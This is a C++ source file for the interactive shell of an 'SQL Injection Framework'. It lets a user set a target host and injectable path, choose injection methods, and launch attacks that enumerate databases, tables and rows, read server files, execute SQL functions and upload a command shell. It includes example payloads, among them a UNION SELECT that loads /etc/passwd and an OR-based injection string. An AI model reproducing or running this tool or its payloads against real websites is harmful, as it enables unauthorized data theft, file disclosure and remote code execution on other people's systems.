// SQL Framework.cpp : Defines the entry point for the console application.
//
#define _CRT_SECURE_NO_WARNINGS		// Disable warnings about insecure function usage
#pragma warning(disable:4996)		// warning C4996: '_swprintf': swprintf has been changed to conform with the ISO C standard, adding an extra character count parameter.

#ifndef _UNICODE		// Enable unicode
#define _UNICODE		// http://msdn.microsoft.com/en-us/library/dybsewaf.aspx
#endif
#ifdef _MBCS			// Don't use 'Multi-Byte Character Set'
#undef _MBCS			// http://msdn.microsoft.com/en-us/library/5z097dxa(VS.71).aspx
#endif

#include <stdio.h>
#include <tchar.h>
//#define USE_PCRE_REGEXP		// Uncomment this if you want to use PCRE regex strings for parsing <not recommended if you don't know regex>

#include "framework.h"

struct COMMANDS
{
    TCHAR *cmd;
    TCHAR *parameters;
    TCHAR *description;
    TCHAR *example;
} commands[] = {
    { _T(""), _T(""), _T("\t\t* --------- Target --------- *"), _T("\0") },
    { _T("host"), _T("<host> (port)"), _T("set the hostname and port to attack"), _T("localhost 80") },
    { _T("path"), _T("<path> (rest)"), _T("set the path to the script with rest behind it"), _T("/path/index.php?filehost='+OR+filehost= +AND+'1") },	// The generated SQL will be pasted after this
    { _T(""), _T(""), _T("\t\t* --------- HTTP --------- *"), _T("\0") },
    { _T("cookie"), _T("<string>"), _T("\tadd <string> as cookie in each http request"), _T("+") },
    { _T("space"), _T("<string>"), _T("\tuse <string> as space in query"), _T("+") },
    { _T("table_quote_char"), _T("<char>"), _T("\tuse <char> as surrounding table name character, ie. ` becomes `tbl_name`"), _T("+") },
    { _T("operands_between_keywords"), _T("<char>"), _T("\tuse operands between keywords, ie. SELECT(COUNT(0))"), _T("+") },
    { _T("dynamic"), _T("<start> <end>"), _T("remove dynamic data between <start> and <end>"), _T("\"<div class='1'>\" </div>") },
    { _T(""), _T(""), _T("\t\t* --------- Query --------- *"), _T("\0") },
    { _T("method"), _T("<id>"), _T("\tmethod to use"), _T("2 4shared") },
    { _T("interval"), _T("<interval>"), _T("wait <interval> milliseconds before next try"), _T("300") },
    { _T("attack"), _T("<type> <params>"), _T("execute query <type> on target"), _T("1") },
    { _T(""), _T(""), _T("\t\t* --------- Results --------- *"), _T("\0") },
    { _T("show"), _T(""), _T("\t\tshow gathered info"), _T("\0") },
    { _T("cache"), _T(""), _T("\t\tshow all cached entries"), _T("\0") },
    { _T("nohistory"), _T("<1 / 0>"), _T("always query target for attack result"), _T("\0") },
    { _T("maxrows"), _T("<max>"), _T("\tretrieve not more than x rows for a table"), _T("\0") },
    { _T(""), _T(""), _T("\t\t* ------------------------------------------ *"), _T("\0") },
    { _T("debug"), _T("<level>"), _T("\tset debug to <level> (0-4)"), _T("3") },
    { _T("help"), _T(""), _T("\t\tshow usage"), _T("\0") },
    { _T("cls"), _T(""), _T("\t\tclear screen"), _T("\0") },
    { _T("quit / exit"), _T(""), _T("\tquit this shell"), _T("\0") }
};

struct info
{
    AttackTypes id;
    TCHAR *description;
    TCHAR *parameters;
} atypes[] = {
    { AttackTypes::kCountDatabases, _T("Count databases"), _T("\t\t\t\t") },
    { AttackTypes::kGetDatabaseName, _T("Get database name"), _T("(index)\t\t\t") },
    { AttackTypes::kCountTablesInDatabase, _T("Count tables in database"), _T("(dbname)\t\t\t") },
    { AttackTypes::kGetTableNameInDatabase, _T("Get table name"), _T("(dbname) (index)\t\t") },
    { AttackTypes::kCountColumnsInTable, _T("Count columns in table"), _T("(dbname) (tablename)\t\t") },
    { AttackTypes::kGetColumnNameInTable, _T("Get column name"), _T("(dbname) (tablename) (index)\t") },
    { AttackTypes::kCountRowsInTable, _T("Count rows in table"), _T("(dbname) (tablename)\t\t") },
    { AttackTypes::kGetRowDataInColumn, _T("Get row data from column(s)"), _T("(dbname) (tablename) (columnname) (columnname) (index)\r\n\t\t\t\t\t") },
    { AttackTypes::kGetRowDataInTable, _T("Get row data from table"), _T("(dbname) (tablename) (index)\t") },
    { AttackTypes::kDatabaseDoAll, _T("Do everything"), _T("\t\t\t\t") },
    { AttackTypes::kGetMysqlVersion, _T("Get MySQL version"), _T("\t\t\t\t") },
    { AttackTypes::kRunCustomCriteria, _T("Retrieves columname for target with criteria"), _T("dbname tablename columnname <target> <criteria>\r\n\t\t\t\t\t") },
    { AttackTypes::kShowFileContents, _T("Load file from server"), _T("<full filepath; empty will try all default files>\t\t") },
    { AttackTypes::kShowConfigVariable, _T("Get SQL config variable"), _T("<variable name>\t\t") },
    { AttackTypes::kExecuteFunction, _T("Execute a SQL function"), _T("<function name>\t\t") },
    { AttackTypes::kUploadShell, _T("Upload a shell and execute commands"), _T("<path to save shell on target>") }
}, methods[] = {
#ifdef USE_PCRE_REGEX
    { (AttackTypes)1, _T("Use bruteforce method"),	_T("<regexp string>\t")},
#else
    { (AttackTypes)1, _T("Use bruteforce method"), _T("<search string> !case sensitive!") },
#endif
    { (AttackTypes)2, _T("Use numberic caching method"), _T("<start page> (end page)\t") },
    { (AttackTypes)3, _T("Use string caching method"), _T("<space seperated keywords>\t") },
    { (AttackTypes)4, _T("Use path for SELECT UNION injection; replace UNION part with XxxX"), _T("(amount of rows the union needs to return; default 1)\r\n") }
    // IE: default.php?filehost='+UNION+SELECT+ALL+0,0,0,0,0,(SELECT+LOAD_FILE('/etc/passwd')),0,0,0,0,0,0,0,0,0,0,0,0,0+FROM+defaultsetting+WHERE+'1
};

Framework *framework = new Framework();
void usage()
{
    LOG(0, _T("\r\n"));
    LOG(0, _T("\tSQL Injection Framework %s"), FRAMEWORK_VERSION);
    LOG(0, _T("\tBy %s"), FRAMEWORK_AUTHOR);
    LOG(0, _T("\r\n"));
    for (int i = 0; i < sizeof(commands) / sizeof(COMMANDS); i++)
    {
        LOG(0, _T("\t%s %s\t%s"), commands[i].cmd, commands[i].parameters, commands[i].description);
    }
    LOG(0, "\r\n");
    LOG(0, "\tExample config:\r\n");
    for (int i = 0; i < sizeof(commands) / sizeof(COMMANDS); i++)
    {
        if (commands[i].example != _T("\0"))
        {
            LOG(0, _T("\t%s %s"), commands[i].cmd, commands[i].example);
        }
    }
}

int _tmain(int m_argc, TCHAR *m_argv[])
{
    usage();
    TCHAR *command = 0;
    TCHAR *argv[255] = { 0 };
    unsigned long argc = 0;
    TCHAR buffer[1024] = { 0 };
    TCHAR *tokpos = 0;
    unsigned long tmp = 0;

    while (true)
    {
        printf("\r\nshell>");
        framework->GetFileHandle() << _T("\r\nshell>");
        _fgetts(buffer, sizeof(buffer), stdin);
        framework->GetFileHandle() << buffer;
        framework->GetFileHandle() << _T("\r\n");

        argc = 0;
        memset(&argv, 0, 20 * sizeof(TCHAR));
        command = _tcstok_s(buffer, _T(" \r\n"), &tokpos);
        if (!command)
            continue;

        do
        {
            argv[argc++] = command;
            command = _tcstok_s(0, _T(" \r\n"), &tokpos);
        } while (command && argc < sizeof(argv));

        command = argv[0];
        if (!_tcscmp(_T("host"), command))
        {
            TCHAR *host = framework->host();
            unsigned short port = framework->port();
            port = (port ? port : 80);
            if (argc < 2)
            {
                LOG(0, _T("host <host> (port)"));
                if (host)
                    LOG(0, _T("Current host: %s:%d (IP: %s)"), host, port, framework->ip());

                continue;
            }
            host = argv[1];
            port = (argc > 2 ? (unsigned short)_wtoi(argv[2]) : 80);
            if (!framework->SetHost(host, port))
                LOG(0, _T("[-] Error (%d): %s"), GetLastError(), framework->error());
            else
                LOG(0, _T("[*] Changed host to %s:%d"), host, port);
        }
        else if (!_tcscmp(_T("path"), command))
        {
            TCHAR *path = framework->path();
            TCHAR *rest = framework->rest();
            rest = (rest ? rest : _T(""));
            if (argc < 2)
            {
                LOG(0, _T("path <path> (rest)"));
                if (path)
                    LOG(0, _T("Current path: %s<SQL injection>%s"), path, (rest ? rest : _T("")));

                continue;
            }
            path = argv[1];
            rest = (argc >= 3 ? argv[2] : _T(""));
            if (!framework->SetPath(path, rest))
                LOG(0, _T("[-] Error (%d): %s"), GetLastError(), framework->error());
            else
                LOG(0, _T("[*] Changed path to %s<SQL injection>%s"), path, rest);
        }
        else if (!_tcscmp(_T("method"), command))
        {
            TCHAR _old = framework->method();
            if (argc < 3)
            {
                LOG(0, _T("method <id> <params>"));
                for (int i = 0; i < sizeof(methods) / sizeof(info); i++)
                    LOG(0, _T("\t%d %s\t%s"), methods[i].id, methods[i].parameters, methods[i].description);

                LOG(0, _T("Current method: %d"), _old);
                continue;
            }
            TCHAR _new = (TCHAR)_wtoi(argv[1]);
            TCHAR **ptr = argv + 2;
            if (!framework->SetMethod((Methods)_new, ptr, argc - 2))
                LOG(0, _T("[-] Error (%d): %s"), GetLastError(), framework->error());
            else
                LOG(0, _T("[*] Changed method id from %d to %d"), _old, _new);
        }
        else if (!_tcscmp(_T("cookie"), command))
        {
            TCHAR *cookie = (argc >= 2 ? argv[1] : 0);
            LOG(0, _T("[*] Changed cookie to %s"), cookie);
            framework->SetCookie(cookie);
        }
        else if (!_tcscmp(_T("space"), command))
        {
            TCHAR *space = (argc >= 2 ? argv[1] : _T(""));
            LOG(0, _T("[*] Changed space to %s"), space);
            framework->SetSpace(space);
        }
        else if (!_tcscmp(__T("table_quote_char"), command))
        {
            TCHAR *table_quote_char = (argc >= 2 ? argv[1] : _T(""));
            LOG(0, _T("[*] Changed table_quote_char to %s"), table_quote_char);
            framework->SetTableQuoteChar(table_quote_char);
        }
        else if (!_tcscmp(_T("dynamic"), command))
        {
            TCHAR *start = framework->dynamics_start();
            TCHAR *end = framework->dynamic_end();
            if (argc < 3)
            {
                LOG(0, _T("dynamic <start> <end>\nNOTE: tags are case sensitive!"));
                if (start && end)
                    LOG(0, _T("Current tags: %s %s"), start, end);
                
                continue;
            }
            framework->SetDynamicTags(argv[1], argv[2]);
            LOG(0, _T("[*] Changed dynamic tags to %s %s\n[*] NOTE: tags are case sensitive!"), argv[1], argv[2]);
        }
        else if (!_tcscmp(_T("interval"), command))
        {
            unsigned long old = framework->interval();
            if (argc < 2)
            {
                LOG(0, _T("interval <milliseconds>"));
                LOG(0, _T("Current inverval: %d milliseconds"), old);
                continue;
            }
            unsigned long interval = _wtol(argv[1]);
            framework->SetInterval(interval);
            LOG(0, _T("[*] Changed interval from %d to %d milliseconds"), old, interval);
        }
        else if (!_tcscmp(_T("attack"), command))
        {
            TCHAR attack = framework->attack_type();
            if (argc < 2)
            {
                LOG(0, _T("attack <type> (params)"));
                for (int i = 0; i < sizeof(atypes) / sizeof(info); i++)
                    LOG(0, _T("\t%d %s\t%s"), atypes[i].id, atypes[i].parameters, atypes[i].description);

                LOG(0, _T("Current attack: %d"), attack);
                continue;
            }
            bool found = false;
            TCHAR _a = (TCHAR)_wtoi(argv[1]);
            for (int i = 0; i < sizeof(atypes); i++)
            {
                if (_a == atypes[i].id)
                {
                    found = true;
                    break;
                }
            }

            if (!found)
            {
                LOG(0, _T("[-] Error: invalid attack type."));
                continue;
            }
            framework->SetAttackType((AttackTypes)_a);
            LOG(0, _T("[*] Changed attack from %d to %d"), attack, _a);
            TCHAR **ptr = argv + 2;
            unsigned long start = GetTickCount();
            if (!framework->Start(ptr, argc - 2))
            {
                LOG(0, _T("[-] Error (%d): %s"), GetLastError(), framework->error());
                continue;
            }
            LOG(0, _T("[*] Done, attack took %d second(s)"), (GetTickCount() - start) / 1000);
        }
        else if (!_tcscmp(_T("show"), command))
        {
            framework->ShowHistoryList();
        }
        else if (!_tcscmp(_T("cache"), command))
        {
            framework->ShowCacheList();
        }
        else if (!_tcscmp(_T("nohistory"), command))
        {
            bool current_value = framework->always_lookup();
            if (argc < 2)
            {
                LOG(0, _T("nohistory <1 / 0>"));
                LOG(0, _T("Current value: %d"), !current_value);
                continue;
            }
            bool new_value = argc >= 2 && _tcscmp(*(argv + 1), _T("1"));
            LOG(0, _T("[*] Changed value from %d to %d"), !current_value, !new_value ? 1 : 0);
            framework->SetLookup(new_value);
        }
        else if (!_tcscmp(_T("maxrows"), command))
        {
            int max_rows = framework->max_rows();
            if (argc < 2)
            {
                LOG(0, _T("maxrows <max amount of rows to retrieve for each table>"));
                LOG(0, _T("current value: %d"), max_rows);
                LOG(0, _T("NOTE: 0 or less means no limit"));
                continue;
            }
            int new_value = _ttoi(*(argv + 1));
            LOG(0, _T("[*] Changed max rows from %d to %d"), max_rows, new_value);
            framework->SetMaxRows(new_value);
        }
        else if (!_tcscmp(_T("debug"), command))
        {
            TCHAR debug = framework->GetDebug();
            if (argc < 2)
            {
                LOG(0, _T("debug <level>"));
                LOG(0, _T("Current debug level: %d"), debug);
                continue;
            }
            TCHAR _d = (TCHAR)_wtoi(argv[1]);
            framework->SetDebug(_d);
            LOG(0, _T("[*] Changed debug from %d to %d"), debug, _d);
        }
        else if (!_tcscmp(_T("help"), command))
        {
            usage();
        }
        else if (!_tcscmp(_T("cls"), command))
        {
            system("cls");
            //for (int i=0; i<300; i++)
            //    _tprintf(_T("\r\n"));
        }
        else if (!_tcscmp(_T("quit"), command) || !_tcscmp(_T("exit"), command))
        {
            LOG(0, _T("[*] Exiting..."));
            break;
        }
        else
        {
            LOG(0, _T("'%s' is not reconized as a valid command."), command);
        }
    }
    return 0;
}
